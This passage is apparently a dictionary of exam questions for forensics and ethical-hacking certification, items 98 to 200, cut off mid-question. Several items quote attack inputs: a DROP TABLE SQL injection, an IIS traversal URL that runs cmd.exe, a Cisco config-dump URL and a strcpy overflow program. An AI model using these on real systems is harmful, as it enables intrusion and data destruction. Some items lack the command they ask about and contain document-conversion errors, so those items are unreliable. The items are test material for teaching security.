Chris has been called upon to investigate a hacking incident reported by one of his clients. The company
suspects the involvement of an insider accomplice in the attack. Upon reaching the incident scene, Chris
secures the physical area, records the scene using visual mediA. He shuts the system down by pulling the
power plug so that he does not disturb the system in any way. He labels all cables and connectors prior to
disconnecting any. What do you think would be the next sequence of events?

A. Connect the target media; prepare the system for acquisition; Secure the evidence; Copy the media
B. Prepare the system for acquisition; Connect the target media; copy the media; Secure the evidence
C. Connect the target media; Prepare the system for acquisition; Secure the evidence; Copy the media
D. Secure the evidence; prepare the system for acquisition; Connect the target media; copy the media
""",

98 : """
The use of warning banners helps a company avoid litigation by overcoming an employee assumed
__________________________. When connecting to the company's intranet, network or Virtual Private
Network(VPN) and will allow the company's investigators to monitor, search and retrieve information stored
within the network.

A. Right to work
B. Right of free speech
C. Right to Internet Access
D. Right of Privacy""",

99 : """
What does mactime, an essential part of the coroner's toolkit do?

A. It traverses the file system and produces a listing of all files based on the modification, access and
change timestamps
B. It can recover deleted file space and search it for datA. However, it does not allow the investigator to
preview them
C. The tools scans for i-node information, which is used by other tools in the tool kit
D. It is too specific to the MAC OS and forms a core component of the toolkit""",

100 : """
One way to identify the presence of hidden partitions on a suspect's hard drive is to:

A. Add up the total size of all known partitions and compare it to the total size of the hard drive
B. Examine the FAT and identify hidden partitions by noting an H in the partition Type field
C. Examine the LILO and note an H in the partition Type field
D. It is not possible to have hidden partitions on a hard drive""",

101 : """
What information do you need to recover when searching a victim’s computer for a crime committed with
specific e-mail message?

A. Internet service provider information
B. E-mail header
C. Username and password
D. Firewall log""",

102 : """
Melanie was newly assigned to an investigation and asked to make a copy of all the evidence from the
compromised system. Melanie did a DOS copy of all the files on the system. What would be the primary
reason for you to recommend a disk imaging tool?

A. A disk imaging tool would check for CRC32s for internal self-checking and validation and have MD5
checksum
B. Evidence file format will contain case data entered by the examiner and encrypted at the beginning of
the evidence file
C. A simple DOS copy will not include deleted files, file slack and other information
D. There is no case for an imaging tool as it will use a closed, proprietary format that if compared to the
original will not match up sector for sector""",

103 : """
You are employed directly by an attorney to help investigate an alleged sexual harassment case at a large
pharmaceutical manufacture. While at the corporate office of the company, the CEO demands to know the
status of the investigation. What prevents you from discussing the case with the CEO?

A. the attorney-work-product rule
B. Good manners
C. Trade secrets
D. ISO 17799""",

104 : """
One technique for hiding information is to change the file extension from the correct one to one that might
not be noticed by an investigator. For example, changing a .jpg extension to a .doc extension so that a
picture file appears to be a document. What can an investigator examine to verify that a file has the correct
extension?

A. the File Allocation Table
B. the file header
C. the file footer
D. the sector map
""",

105 : """
This organization maintains a database of hash signatures for known software.

A. International Standards Organization
B. Institute of Electrical and Electronics Engineers
C. National Software Reference Library
D. American National standards Institute""",

106 : """
The ____________________ refers to handing over the results of private investigations to the authorities
because of indications of criminal activity.

A. Locard Exchange Principle
B. Clark Standard
C. Kelly Policy
D. Silver-Platter Doctrine""",

107 : """
You are working as Computer Forensics investigator and are called by the owner of an accounting firm to
investigate possible computer abuse by one of the firm’s employees. You meet with the owner of the firm
and discover that the company has never published a policy stating that they reserve the right to inspect
their computing assets at will. What do you do?

A. Inform the owner that conducting an investigation without a policy is not a problem because the
company is privately owned
B. Inform the owner that conducting an investigation without a policy is a violation of the 4th amendment
C. Inform the owner that conducting an investigation without a policy is a violation of the employee’s
expectation of privacy
D. Inform the owner that conducting an investigation without a policy is not a problem because a policy is
only necessary for government agencies""",

108 : """
During the course of a corporate investigation, you find that an Employee is committing a crime.

Can the Employer file a criminal complaint with Police?

A. Yes, and all evidence can be turned over to the police
B. Yes, but only if you turn the evidence over to a federal law enforcement agency
C. No, because the investigation was conducted without following standard police procedures
D. No, because the investigation was conducted without warrant""",

109 : """
____________________ is simply the application of Computer Investigation and analysis techniques in the
interests of determining potential legal evidence.

A. Network Forensics
B. Computer Forensics
C. Incident Response
D. Event Reaction""",

110 : """
What is the name of the Standard Linux Command that is also available as windows application that can
be used to create bit-stream images?

A. mcopy
B. image
C. MD5
D. dd""",

111 : """
To preserve digital evidence, an investigator should ____________________.

A. Make two copies of each evidence item using a single imaging tool
B. Make a single copy of each evidence item using an approved imaging tool
C. Make two copies of each evidence item using different imaging tools
D. Only store the original evidence item""",

112 : """
Profiling is a forensics technique for analyzing evidence with the goal of identifying the perpetrator from
their various activity. After a computer has been compromised by a hacker, which of the following would be
most important in forming a profile of the incident?

A. The manufacturer of the system compromised
B. The logic, formatting and elegance of the code used in the attack
C. The nature of the attack
D. The vulnerability exploited in the incident""",

113 : """
Printing under a Windows Computer normally requires which one of the following files types to be created?

A. EME
B. MEM
C. EMF
D. CME""",

114 : """
An Expert witness give an opinion if:

A. The Opinion, inferences or conclusions depend on special knowledge, skill or training not within the
ordinary experience of lay jurors
B. To define the issues of the case for determination by the finder of fact
C. To stimulate discussion between the consulting expert and the expert witness
D. To deter the witness form expanding the scope of his or her investigation beyond the requirements of
the case""",

115 : """
When using Windows acquisitions tools to acquire digital evidence, it is important to use a well-tested
hardware write-blocking device to:

A. Automate Collection from image files
B. Avoiding copying data from the boot partition
C. Acquire data from host-protected area on a disk
D. Prevent Contamination to the evidence drive
""",

116 : """
Office Documents (Word, Excel and PowerPoint) contain a code that allows tracking the MAC or unique
identifier of the machine that created the document. What is that code called?

A. Globally unique ID
B. Microsoft Virtual Machine Identifier
C. Personal Application Protocol
D. Individual ASCII string""",

117 : """
You have completed a forensic investigation case. You would like to destroy the data contained in various
disks at the forensics lab due to sensitivity of the case. How would you permanently erase the data on the
hard disk?

A. Throw the hard disk into the fire
B. Run the powerful magnets over the hard disk
C. Format the hard disk multiple times using a low level disk utility
D. Overwrite the contents of the hard disk with Junk data""",

118 : """
You have been asked to investigate after a user has reported a threatening e-mail they have received from
an external source. Which of the following are you most interested in when trying to trace the source of the
message?

A. The X509 Address
B. The SMTP reply Address
C. The E-mail Header
D. The Host Domain Name""",

119 : """
You are working as a Computer forensics investigator for a corporation on a computer abuse case. You

discover evidence that shows the subject of your investigation is also embezzling money from the
company. The company CEO and the corporate legal counsel advise you to contact law enforcement and
provide them with the evidence that you have found. The law enforcement officer that responds requests
that you put a network sniffer on your network and monitor all traffic to the subject’s computer. You inform
the officer that you will not be able to comply with that request because doing so would:

A. Violate your contract
B. Cause network congestion
C. Make you an agent of law enforcement
D. Write information to the subject’s hard drive""",

120 : """
A law enforcement officer may only search for and seize criminal evidence with
_______________________, which are facts or circumstances that would lead a reasonable person to
believe a crime has been committed or is about to be committed, evidence of the specific crime exists and
the evidence of the specific crime exists at the place to be searched.

A. Mere Suspicion
B. A preponderance of the evidence
C. Probable cause
D. Beyond a reasonable doubt""",

121 : """
The police believe that Melvin Matthew has been obtaining unauthorized access to computers belonging to
numerous computer software and computer operating systems manufacturers, cellular telephone
manufacturers, Internet Service Providers and Educational Institutions. They also suspect that he has been
stealing, copying and misappropriating proprietary computer software belonging to the several victim
companies. What is preventing the police from breaking down the suspects door and searching his home
and seizing all of his computer equipment if they have not yet obtained a warrant?

A. The Fourth Amendment
B. The USA patriot Act
C. The Good Samaritan Laws
D. The Federal Rules of Evidence""",

122 : """
When cataloging digital evidence, the primary goal is to

A. Make bit-stream images of all hard drives
B. Preserve evidence integrity
C. Not remove the evidence from the scene
D. Not allow the computer to be turned off""",

123 : """
You are conducting an investigation of fraudulent claims in an insurance company that involves complex
text searches through large numbers of documents. Which of the following tools would allow you to quickly
and efficiently search for a string within a file on the bitmap image of the target computer?

A. Stringsearch
B. grep
C. dir
D. vim""",

124 : """
As a CHFI professional, which of the following is the most important to your professional reputation?

A. Your Certifications
B. The correct, successful management of each and every case
C. The free that you charge
D. The friendship of local law enforcement officers""",

125 : """
In conducting a computer abuse investigation you become aware that the suspect of the investigation is
using ABC Company as his Internet Service Provider (ISP). You contact ISP and request that they provide
you assistance with your investigation. What assistance can the ISP provide?

A. The ISP can investigate anyone using their service and can provide you with assistance
B. The ISP can investigate computer abuse committed by their employees, but must preserve the privacy
of their customers and therefore cannot assist you without a warrant
C. The ISP can't conduct any type of investigations on anyone and therefore can't assist you
D. ISP's never maintain log files so they would be of no use to your investigation""",

126 : """
You are assisting in the investigation of a possible Web Server Hack. The company who called you stated
that customers reported to them that whenever they entered the web address of the company in their
browser, what they received was a porno graphic web site. The company checked the web server and
nothing appears wrong. When you type in the IP address of the web site in your browser everything
appears normal. What is the name of the attack that affects the DNS cache of the name resolution servers,
resulting in those servers directing users to the wrong web site?

A. ARP Poisoning
B. DNS Poisoning
C. HTTP redirect attack
D. IP Spoofing""",

127 : """
You are working as an independent computer forensics investigator and receive a call from a systems
administrator for a local school system requesting your assistance. One of the students at the local high
school is suspected of downloading inappropriate images from the Internet to a PC in the Computer lab.
When you arrive at the school, the systems administrator hands you a hard drive and tells you that he
made a simple backup copy of the hard drive in the PC and put it on this drive and requests that you
examine that drive for evidence of the suspected images. You inform him that a simple backup copy will
not provide deleted files or recover file fragments.
What type of copy do you need to make to ensure that the evidence found is complete and admissible in
future proceedings?

A. Bit-stream Copy
B. Robust Copy
C. Full backup Copy
D. Incremental Backup Copy""",

128 : """
Law enforcement officers are conducting a legal search for which a valid warrant was obtained.
While conducting the search, officers observe an item of evidence for an unrelated crime that was not
included in the warrant. The item was clearly visible to the officers and immediately identified as evidence.
What is the term used to describe how this evidence is admissible?

A. Plain view doctrine
B. Corpus delicti
C. Locard Exchange Principle
D. Ex Parte Order""",

129 : """
Microsoft Outlook maintains email messages in a proprietary format in what type of file?

A. .email
B. .mail
C. .pst
D. .doc""",

130 : """
The efforts to obtain information before a trail by demanding documents, depositions, "ed and
answers written under oath, written requests for admissions of fact and examination of the scene is a
description of what legal term?

A. Detection
B. Hearsay
C. Spoliation
D. Discovery""",

131 : """
The rule of thumb when shutting down a system is to pull the power plug. However, it has certain
drawbacks. Which of the following would that be?

A. Any data not yet flushed to the system will be lost
B. All running processes will be lost
C. The /tmp directory will be flushed
D. Power interruption will corrupt the pagefile""",

132 : """
You are a computer forensics investigator working with local police department and you are called to assist
in an investigation of threatening emails. The complainant has printer out 27 email messages from the
suspect and gives the printouts to you. You inform her that you will need to examine her computer because
you need access to the _________________________ in order to track the emails back to the suspect.

A. Routing Table
B. Firewall log
C. Configuration files
D. Email Header
""",

133 : """
Hackers can gain access to Windows Registry and manipulate user passwords, DNS settings, access
rights or others features that they may need in order to accomplish their objectives. One simple method for
loading an application at startup is to add an entry (Key) to the following Registry Hive:

A. HKEY_LOCAL_MACHINE\hardware\windows\start
B. HKEY_LOCAL_USERS\Software\Microsoft\old\Version\Load
C. HKEY_CURRENT_USER\Microsoft\Default
D. HKEY_LOCAL_MACHINE\Software\Microsoft\CurrentVersion\Run""",

134 : """
Which of the following file system is used by Mac OS X?

A. EFS
B. HFS+
C. EXT2
D. NFS""",

135 : """
When you are running a vulnerability scan on a network and the IDS cuts off your connection, what type of
IDS is being used?

A. Passive IDS
B. Active IDS
C. Progressive IDS
D. NIPS""",

136 : """
Simon is a former employee of Trinitron XML Inc. He feels he was wrongly terminated and wants to hack
into his former company's network. Since Simon remembers some of the server names, he attempts to run
the axfr and ixfr commands using DIG. What is Simon trying to accomplish here?

A. Send DOS commands to crash the DNS servers
B. Perform DNS poisoning
C. Perform a zone transfer
D. Enumerate all the users in the domain""",

137 : """
What will the following command produce on a website login page? SELECT email, passwd, login_id,
full_name FROM members WHERE email = 'someone@somehwere.com'; DROP TABLE members; --'

A. Deletes the entire members table
B. Inserts the Error! Reference source not found.email address into the members table
C. Retrieves the password for the first user in the members table
D. This command will not produce anything since the syntax is incorrect""",

138 : """
You setup SNMP in multiple offices of your company. Your SNMP software manager is not receiving data
from other offices like it is for your main office. You suspect that firewall changes are to blame. What ports
should you open for SNMP to work through Firewalls? (Choose two.)

A. 162
B. 161
C. 163
D. 160


""",

139 : """
You are carrying out the last round of testing for your new website before it goes live. The website has
many dynamic pages and connects to a SQL backend that accesses your product inventory in a database.
You come across a web security site that recommends inputting the following code into a search field on
web pages to check for vulnerabilities: When you type this and click on search, you receive a pop-up
window that says: "This is a test."
What is the result of this test?

A. Your website is vulnerable to CSS
B. Your website is not vulnerable
C. Your website is vulnerable to SQL injection
D. Your website is vulnerable to web bugs
""",

140 : """
If an attacker's computer sends an IPID of 31400 to a zombie computer on an open port in IDLE scanning,
what will be the response?

A. The zombie will not send a response
B. 31402
C. 31399
D. 31401""",

141 : """
Michael works for Kimball Construction Company as senior security analyst. As part of yearly security audit,
Michael scans his network for vulnerabilities. Using Nmap, Michael conducts XMAS scan and most of the
ports scanned do not give a response. In what state are these ports?

A. Closed
B. Open
C. Stealth
D. Filtered""",

142 : """
You are assisting a Department of Defense contract company to become compliant with the stringent
security policies set by the DoD. One such strict rule is that firewalls must only allow incoming connections
that were first initiated by internal computers. What type of firewall must you implement to abide by this
policy?

A. Packet filtering firewall
B. Circuit-level proxy firewall
C. Application-level proxy firewall
D. Stateful firewall""",

143 : """
Jessica works as systems administrator for a large electronics firm. She wants to scan her network quickly

to detect live hosts by using ICMP ECHO Requests. What type of scan is Jessica going to perform?

A. Tracert
B. Smurf scan
C. Ping trace
D. ICMP ping sweep""",

144 : """
You work as an IT security auditor hired by a law firm in Boston to test whether you can gain access to
sensitive information about the company clients. You have rummaged through their trash and found very
little information. You do not want to set off any alarms on their network, so you plan on performing passive
foot printing against their Web servers. What tool should you use?

A. Ping sweep
B. Nmap
C. Netcraft
D. Dig""",

145 : """
You are a security analyst performing a penetration tests for a company in the Midwest. After some initial
reconnaissance, you discover the IP addresses of some Cisco routers used by the company. You type in
the following URL that includes the IP address of one of the routers:
http://172.168.4.131/level/99/exec/show/config
After typing in this URL, you are presented with the entire configuration file for that router. What have you
discovered?

A. HTTP Configuration Arbitrary Administrative Access Vulnerability
B. HTML Configuration Arbitrary Administrative Access Vulnerability
C. Cisco IOS Arbitrary Administrative Access Online Vulnerability
D. URL Obfuscation Arbitrary Administrative Access Vulnerability""",

146 : """
What is the following command trying to accomplish?

A. Verify that UDP port 445 is open for the 192.168.0.0 network
B. Verify that TCP port 445 is open for the 192.168.0.0 network
C. Verify that NETBIOS is running for the 192.168.0.0 network
D. Verify that UDP port 445 is closed for the 192.168.0.0 network
""", 
147 : """
You are the network administrator for a small bank in Dallas, Texas. To ensure network security, you enact
a security policy that requires all users to have 14 character passwords. After giving your users 2 weeks
notice, you change the Group Policy to force 14 character passwords. A week later you dump the SAM
database from the standalone server and run a password-cracking tool against it. Over 99% of the
passwords are broken within an hour. Why were these passwords cracked so Quickly?

A. Passwords of 14 characters or less are broken up into two 7-character hashes
B. A password Group Policy change takes at least 3 weeks to completely replicate throughout a network
C. Networks using Active Directory never use SAM databases so the SAM database pulled was empty
D. The passwords that were cracked are local accounts on the Domain Controller""",

148 : """
An "idle"system is also referred to as what?

A. PC not connected to the Internet
B. Zombie
C. PC not being used
D. Bot""",

149 : """
Larry is an IT consultant who works for corporations and government agencies. Larry plans on shutting
down the city's network using BGP devices and zombies? What type of Penetration Testing is Larry
planning to carry out?

A. Router Penetration Testing
B. DoS Penetration Testing
C. Firewall Penetration Testing
D. Internal Penetration Testing""",

150 : """

John and Hillary works at the same department in the company. John wants to find out Hillary's network
password so he can take a look at her documents on the file server. He enables Lophtcrack program to
sniffing mode. John sends Hillary an email with a link to Error! Reference source not found. What
information will he be able to gather from this?

A. Hillary network username and password hash
B. The SID of Hillary network account
C. The SAM file from Hillary computer
D. The network shares that Hillary has permissions""",

151 : """
Bill is the accounting manager for Grummon and Sons LLC in Chicago. On a regular basis, he needs to
send PDF documents containing sensitive information through E-mail to his customers.
Bill protects the PDF documents with a password and sends them to their intended recipients.
Why PDF passwords do not offer maximum protection?

A. PDF passwords can easily be cracked by software brute force tools
B. PDF passwords are converted to clear text when sent through E-mail
C. PDF passwords are not considered safe by Sarbanes-Oxley
D. When sent through E-mail, PDF passwords are stripped from the document completely""",

152 : """
Meyer Electronics Systems just recently had a number of laptops stolen out of their office. On these laptops
contained sensitive corporate information regarding patents and company strategies. A month after the
laptops were stolen, a competing company was found to have just developed products that almost exactly
duplicated products that Meyer produces. What could have prevented this information from being stolen
from the laptops?

A. EFS Encryption
B. DFS Encryption
C. IPS Encryption
D. SDW Encryption""",

153 : """
Kimberly is studying to be an IT security analyst at a vocational school in her town. The school offers many
different programming as well as networking languages. What networking protocol language should she
learn that routers utilize?

A. ATM
B. UDP
C. BPG
D. OSPF""",

154 : """
What is the target host IP in the following command?

A. 172.16.28.95
B. 10.10.150.1
C. Firewalk does not scan target hosts
D. This command is using FIN packets, which cannot scan target hosts""",

155 : """
George is a senior security analyst working for a state agency in FloridA. His state's congress just passed a
bill mandating every state agency to undergo a security audit annually. After learning what will be required,
George needs to implement an IDS as soon as possible before the first audit occurs. The state bill requires
that an IDS with a "time-based induction machine"be used.
What IDS feature must George implement to meet this requirement?

A. Signature-based anomaly detection
B. Pattern matching
C. Real-time anomaly detection
D. Statistical-based anomaly detection""",

156 : """
John is using Firewalk to test the security of his Cisco PIX firewall. He is also utilizing a sniffer located on a
subnet that resides deep inside his network. After analyzing the sniffer log files, he does not see any of the
traffic produced by Firewalk. Why is that?

A. Firewalk cannot pass through Cisco firewalls
B. Firewalk sets all packets with a TTL of zero
C. Firewalk cannot be detected by network sniffers
D. Firewalk sets all packets with a TTL of one""",

157 : """
After undergoing an external IT audit, George realizes his network is vulnerable to DDoS attacks.
What countermeasures could he take to prevent DDoS attacks?

A. Enable direct broadcasts
B. Disable direct broadcasts
C. Disable BGP
D. Enable BGP""",

158 : """
George is performing security analysis for Hammond and Sons LLC. He is testing security vulnerabilities of
their wireless network. He plans on remaining as "stealthy"as possible during the scan. Why would a
scanner like Nessus is not recommended in this situation?

A. Nessus is too loud
B. Nessus cannot perform wireless testing
C. Nessus is not a network scanner
D. There are no ways of performing a "stealthy"wireless scan""",

159 : """
At what layer of the OSI model do routers function on?

A. 4
B. 3
C. 1
D. 5""",

160 : """
Frank is working on a vulnerability assessment for a company on the West coast. The company hired
Frank to assess its network security through scanning, pen tests, and vulnerability assessments. After
discovering numerous known vulnerabilities detected by a temporary IDS he set up, he notices a number of
items that show up as unknown but "able in the logs. He looks up the behavior on the Internet, but
cannot find anything related. What organization should Frank submit the log to find out if it is a new
vulnerability or not?

A. APIPA
B. IANA
C. CVE
D. RIPE""",

161 : """
George is the network administrator of a large Internet company on the west coast. Per corporate policy,
none of the employees in the company are allowed to use FTP or SFTP programs without obtaining
approval from the IT department. Few managers are using SFTP program on their computers. Before
talking to his boss, George wants to have some proof of their activity. George wants to use Ethereal to
monitor network traffic, but only SFTP traffic to and from his network.
What filter should George use in Ethereal?

A. src port 23 and dst port 23
B. udp port 22 and host 172.16.28.1/24
C. net port 22
D. src port 22 and dst port 22""",

162 : """
Your company uses Cisco routers exclusively throughout the network. After securing the routers to the best
of your knowledge, an outside security firm is brought in to assess the network security.
Although they found very few issues, they were able to enumerate the model, OS version, and capabilities
for all your Cisco routers with very little effort. Which feature will you disable to eliminate the ability to
enumerate this information on your Cisco routers?

A. Border Gateway Protocol
B. Cisco Discovery Protocol
C. Broadcast System Protocol
D. Simple Network Management Protocol""",

163 : """
In Linux, what is the smallest possible shellcode?

A. 24 bytes
B. 8 bytes
C. 800 bytes
D. 80 bytes
""",

164 : """
Jim performed a vulnerability analysis on his network and found no potential problems. He runs another
utility that executes exploits against his system to verify the results of the vulnerability test.
The second utility executes five known exploits against his network in which the vulnerability analysis said
were not exploitable. What kind of results did Jim receive from his vulnerability analysis?

A. False negatives
B. False positives
C. True negatives
D. True positives""",

165 : """
You work as a penetration tester for Hammond Security Consultants. You are currently working on a
contract for the state government of CaliforniA. Your next step is to initiate a DoS attack on their network.
Why would you want to initiate a DoS attack on a system you are testing?

A. Show outdated equipment so it can be replaced
B. List weak points on their network
C. Use attack as a launching point to penetrate deeper into the network
D. Demonstrate that no system can be protected against DoS attacks""",

166 : """
Why are Linux/Unix based computers better to use than Windows computers for idle scanning?

A. Linux/Unix computers are easier to compromise
B. Linux/Unix computers are constantly talking
C. Windows computers are constantly talking
D. Windows computers will not respond to idle scans""",

167 : """
What operating system would respond to the following command?

A. Windows 95
B. FreeBSD
C. Windows XP
D. Mac OS X""",

168 : """
Paul's company is in the process of undergoing a complete security audit including logical and physical
security testing. After all logical tests were performed; it is now time for the physical round to begin. None of
the employees are made aware of this round of testing. The security-auditing firm sends in a technician
dressed as an electrician. He waits outside in the lobby for some employees to get to work and follows
behind them when they access the restricted areas. After entering the main office, he is able to get into the
server room telling the IT manager that there is a problem with the outlets in that room. What type of attack
has the technician performed?

A. Tailgating
B. Backtrapping
C. Man trap attack
D. Fuzzing""",

169 : """
On Linux/Unix based Web servers, what privilege should the daemon service be run under?

A. Guest
B. Root
C. You cannot determine what privilege runs the daemon service
D. Something other than root""",

170 : """
What will the following URL produce in an unpatched IIS Web Server?
http://www.thetargetsite.com/scripts/..\\% \\co\\%af../..\\%co\\%af../windows/system32/cmd.exe?/c+dir+c:\\

A. Directory listing of C: drive on the web server
B. Insert a Trojan horse into the C: drive of the web server
C. Execute a buffer flow in the C: drive of the web server
D. Directory listing of the C:\windows\system32 folder on the web server""",

171 : """
What is kept in the following directory? HKLM\SECURITY\Policy\Secrets

A. Cached password hashes for the past 20 users
B. Service account passwords in plain text
C. IAS account names and passwords
D. Local store PKI Kerberos certificates""",

172 : """
Harold is a security analyst who has just run the rdisk /s command to grab the backup SAM files on a
computer. Where should Harold navigate on the computer to find the file?

A. \\%systemroot%\system32\LSA
B. \\%systemroot%\system32\drivers\etc
C. \\%systemroot%\ repair
D. \\%systemroot%\LSA""",

173 : """
You are trying to locate Microsoft Outlook Web Access Default Portal using Google search on the Internet.
What search string will you use to locate them?

A. allinurl:"exchange/logon.asp"
B. intitle:"exchange server"
C. locate:"logon page"
D. outlook:"search"
""",

174 : """
When setting up a wireless network with multiple access points, why is it important to set each access point
on a different channel?

A. Multiple access points can be set up on the same channel without any issues
B. Avoid over-saturation of wireless signals
C. So that the access points will work on different frequencies
D. Avoid cross talk
""",

175 : """
You are running through a series of tests on your network to check for any security vulnerabilities.
After normal working hours, you initiate a DoS attack against your external firewall. The firewall Quickly
freezes up and becomes unusable. You then initiate an FTP connection from an external IP into your
internal network. The connection is successful even though you have FTP blocked at the external firewall.
What has happened?

A. The firewall failed-bypass
B. The firewall failed-closed
C. The firewall ACL has been purged
D. The firewall failed-open""",

176 : """
You just passed your ECSA exam and are about to start your first consulting job running security audits for
a financial institution in Los Angeles. The IT manager of the company you will be working for tries to see if
you remember your ECSA class. He asks about the methodology you will be using to test the company's
network. How would you answer?

A. Microsoft Methodology
B. Google Methodology
C. IBM Methodology
D. LPT Methodology""",

177 : """
Software firewalls work at which layer of the OSI model?

A. Application
B. Network
C. Transport
D. Data Link""",

178 : """
After passing her CEH exam, Carol wants to ensure that her network is completely secure. She
implements a DMZ, stateful firewall, NAT, IPSEC, and a packet filtering firewall. Since all security
measures were taken, none of the hosts on her network can reach the Internet. Why is that?

A. Stateful firewalls do not work with packet filtering firewalls
B. NAT does not work with stateful firewalls
C. IPSEC does not work with packet filtering firewalls
D. NAT does not work with IPSEC""",

179 : """
Jason has set up a honeypot environment by creating a DMZ that has no physical or logical access to his
production network. In this honeypot, he has placed a server running Windows Active Directory. He has
also placed a Web server in the DMZ that services a number of web pages that offer visitors a chance to
download sensitive information by clicking on a button. A week later, Jason finds in his network logs how an
intruder accessed the honeypot and downloaded sensitive information. Jason uses the logs to try and
prosecute the intruder for stealing sensitive corporate information. Why will this not be viable?

A. Entrapment
B. Enticement
C. Intruding into a honeypot is not illegal
D. Intruding into a DMZ is not illegal""",

180 : """
You have compromised a lower-level administrator account on an Active Directory network of a small
company in Dallas, Texas. You discover Domain Controllers through enumeration. You connect to one of
the Domain Controllers on port 389 using ldp.exe. What are you trying to accomplish here?

A. Poison the DNS records with false records
B. Enumerate MX and A records from DNS
C. Establish a remote connection to the Domain Controller
D. Enumerate domain user accounts and built-in groups""",

181 : """
What are the security risks of running a "repair"installation for Windows XP?

A. Pressing Shift+F10gives the user administrative rights
B. Pressing Shift+F1gives the user administrative rights
C. Pressing Ctrl+F10 gives the user administrative rights
D. There are no security risks when running the "repair"installation for Windows XP
""",

182 : """
Terri works for a security consulting firm that is currently performing a penetration test on First National
Bank in Tokyo. Terri's duties include bypassing firewalls and switches to gain access to the network. Terri
sends an IP packet to one of the company's switches with ACK bit and the source address of her machine
set. What is Terri trying to accomplish by sending this IP packet?

A. Trick the switch into thinking it already has a session with Terri's computer
B. Poison the switch's MAC address table by flooding it with ACK bits
C. Crash the switch with a DoS attack since switches cannot send ACK bits
D. Enable tunneling feature on the switch""",

183 : """
You are a security analyst performing reconnaissance on a company you will be carrying out a penetration
test for. You conduct a search for IT jobs on Dice.com and find the following information for an open
position: 7+ years experience in Windows Server environment 5+ years experience in Exchange 2000/2003
environment Experience with Cisco Pix Firewall, Linksys 1376 router, Oracle 11i and MYOB v3.4
Accounting software are required MCSA desired, MCSE, CEH preferred No Unix/Linux Experience needed
What is this information posted on the job website considered?

A. Social engineering exploit
B. Competitive exploit
C. Information vulnerability
D. Trade secret""",

184 : """
The objective of this act was to protect consumers’ personal financial information held by financial
institutions and their service providers.

A. Gramm-Leach-Bliley Act
B. Sarbanes-Oxley 2002
C. California SB 1386
D. HIPAA""",

185 : """
Why is it a good idea to perform a penetration test from the inside?

A. It is never a good idea to perform a penetration test from the inside
B. Because 70\\% \\of attacks are from inside the organization
C. To attack a network from a hacker's perspective
D. It is easier to hack from the inside""",

186 : """
Harold is a web designer who has completed a website for ghttech.net. As part of the maintenance
agreement he signed with the client, Harold is performing research online and seeing how much exposure
the site has received so far. Harold navigates to google.com and types in the following search.
link:www.ghttech.net What will this search produce?

A. All sites that ghttech.net links to
B. All sites that link to ghttech.net
C. All search engines that link to .net domains
D. Sites that contain the code: link:www.ghttech.net""",

187 : """
Jonathan is a network administrator who is currently testing the internal security of his network. He is
attempting to hijack a session, using Ettercap, of a user connected to his Web server. Why will Jonathan
not succeed?

A. Only an HTTPS session can be hijacked
B. HTTP protocol does not maintain session
C. Only FTP traffic can be hijacked
D. Only DNS traffic can be hijacked""",

188 : """
A packet is sent to a router that does not have the packet destination address in its route table.
How will the packet get to its proper destination?

A. Root Internet servers
B. Border Gateway Protocol
C. Gateway of last resort
D. Reverse DNS
""",

189 : """
James is testing the ability of his routers to withstand DoS attacks. James sends ICMP ECHO requests to
the broadcast address of his network. What type of DoS attack is James testing against his network?

A. Smurf
B. Trinoo
C. Fraggle
D. SYN flood""",

190 : """
Kyle is performing the final testing of an application he developed for the accounting department.
His last round of testing is to ensure that the program is as secure as possible. Kyle runs the following
command. What is he testing at this point?
#include #include int main(int argc, char
*argv[]) { char buffer[10]; if (argc < 2) { fprintf (stderr, "USAGE: \\%s string\\\n", argv[0]); return 1; }
strcpy(buffer, argv[1]); return 0; }

A. Buffer overflow
B. SQL injection
C. Format string bug
D. Kernal injection""",

191 : """
You are running known exploits against your network to test for possible vulnerabilities. To test the strength
of your virus software, you load a test network to mimic your production network. Your software
successfully blocks some simple macro and encrypted viruses. You decide to really test the software by
using virus code where the code rewrites itself entirely and the signatures change from child to child, but
the functionality stays the same. What type of virus is this that you are testing?

A. Polymorphic
B. Metamorphic
C. Oligomorhic
D. Transmorphic""",

192 : """
What is a good security method to prevent unauthorized users from "tailgating"?

A. Man trap
B. Electronic combination locks
C. Pick-resistant locks
D. Electronic key systems""",

193 : """
You are the security analyst working for a private company out of France. Your current assignment is to
obtain credit card information from a Swiss bank owned by that company. After initial reconnaissance, you
discover that the bank security defenses are very strong and would take too long to penetrate. You decide
to get the information by monitoring the traffic between the bank and one of its subsidiaries in London. After
monitoring some of the traffic, you see a lot of FTP packets traveling back and forth. You want to sniff the
traffic and extract usernames and passwords. What tool could you use to get this information?

A. Airsnort
B. Snort
C. Ettercap
D. RaidSniff""",

194 : """
As a security analyst, you setup a false survey website that will require users to create a username and a
strong password. You send the link to all the employees of the company. What information will you be able
to gather?

A. The IP address of the employees’ computers
B. Bank account numbers and the corresponding routing numbers
C. The employees network usernames and passwords
D. The MAC address of the employees’ computers""",

195 : """
Julia is a senior security analyst for Berber Consulting group. She is currently working on a contract for a
small accounting firm in Florid A. They have given her permission to perform social engineering attacks on
the company to see if their in-house training did any good. Julia calls the main number for the accounting
firm and talks to the receptionist. Julia says that she is an IT technician from the company's main office in

IowA. She states that she needs the receptionist's network username and password to troubleshoot a
problem they are having. Julia says that Bill Hammond, the CEO of the company, requested this
information. After hearing the name of the CEO, the receptionist gave Julia all the information she asked
for. What principal of social engineering did Julia use?

A. Social Validation
B. Scarcity
C. Friendship/Liking
D. Reciprocation""",

196 : """
Harold wants to set up a firewall on his network but is not sure which one would be the most appropriate.
He knows he needs to allow FTP traffic to one of the servers on his network, but he wants to only allow
FTP-PUT. Which firewall would be most appropriate for Harold? needs?

A. Circuit-level proxy firewall
B. Packet filtering firewall
C. Application-level proxy firewall
D. Data link layer firewall""",

197 : """
What will the following command accomplish?

A. Test ability of a router to handle over-sized packets
B. Test the ability of a router to handle under-sized packets
C. Test the ability of a WLAN to handle fragmented packets
D. Test the ability of a router to handle fragmented packets""",

198 : """
What does ICMP Type 3/Code 13 mean?

A. Host Unreachable
B. Administratively Blocked
C. Port Unreachable
D. Protocol Unreachable
""",

199 : """
How many bits is Source Port Number in TCP Header packet?

A. 16
B. 32
C. 48
D. 64""",

200 : """
After passively scanning the network of Department of Defense (DoD), you switch over to active scanning
to identify live hosts on their network. DoD is a large organization and should respond to any number of
scans. You start an ICMP ping sweep by sending an IP packet to the broadcast address. Only five hosts
respond to your ICMP pings; definitely not the number of hosts you were expecting. Why did this ping
sweep only produce a few responses?

A. Only IBM AS/400 will reply to this scan
B. Only Windows systems will reply to this scan
